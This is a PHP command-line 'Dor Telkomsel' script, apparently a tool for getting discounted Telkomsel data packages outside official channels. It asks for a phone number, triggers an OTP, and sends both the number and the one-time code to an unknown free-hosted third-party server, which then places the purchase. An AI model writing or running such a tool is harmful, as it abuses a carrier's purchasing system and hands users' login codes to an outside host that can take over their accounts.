<?php
error_reporting(0);
output_clean("________        ________ 
___  __ \______ ___  __ \
__  / / /_  __ \__  /_/ /
_  /_/ / / /_/ /_  _, _/ 
/_____/  \____/ /_/ |_|  
                         ");
output_clean(" Dor Telkomsel CLI Version");
output_clean(" v.1.4");
output_clean(" © fznxn - 2019");
output_clean("_______________________________ _ _ _ _ _ _");
output_clean("");

sleep(1);
output_clean(" List Dor :
 1. OMG | 5GB | Rp10k | 30D
 2. FLASH 4G | 50GB | Rp50k | 7D
 3. Maxstream | 30GB | Rp30k | 30D
 4. GigaMax | 6GB | Rp25k | 30D");

output_clean("_______________________________");

sleep(1);
echo "PILIH PAKET : ";
$paket = trim(fgets(STDIN));
if ($paket > 4){
 echo "Paket tidak ditemukan\n";
 exit();
}

//get otp
sleep(1);
echo "\nNOMOR \t: ";
$nomor = trim(fgets(STDIN));

$res = file_get_contents("https://testnanikore.000webhostapp.com/api.php?nope=$nomor&reqotp");
if (empty($nomor)){
    echo 'Nomor tidak boleh kosong.';
    } else {
    echo "Mengirim OTP...\n";
    sleep(2);
    if (strpos($res,"dikirim")) {
    echo "Berhasil mengirim OTP";
    }else {
    echo "Gagal mengirim OTP\n";
    exit();
    }
    echo "\n";
    }
    
//dor
sleep(1);
echo "\nOTP \t: ";
$otepe = trim(fgets(STDIN));
$result = file_get_contents("https://testnanikore.000webhostapp.com/api.php?nope=$nomor&otp=$otepe&beli&mbul=$paket");
if (strpos($result,"diproses")){
    echo "Terima kasih, permintaan anda sedang diproses. Silahkan tunggu SMS selanjutnya.\n";
    sleep(2);
    echo "\nPLEASE DONATE ME\n";
}else {
    echo $result;
    sleep(2);
    echo "\nPLEASE DONATE ME\n";
}

function output_clean($pesan) {
echo $pesan, PHP_EOL;
}
?>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           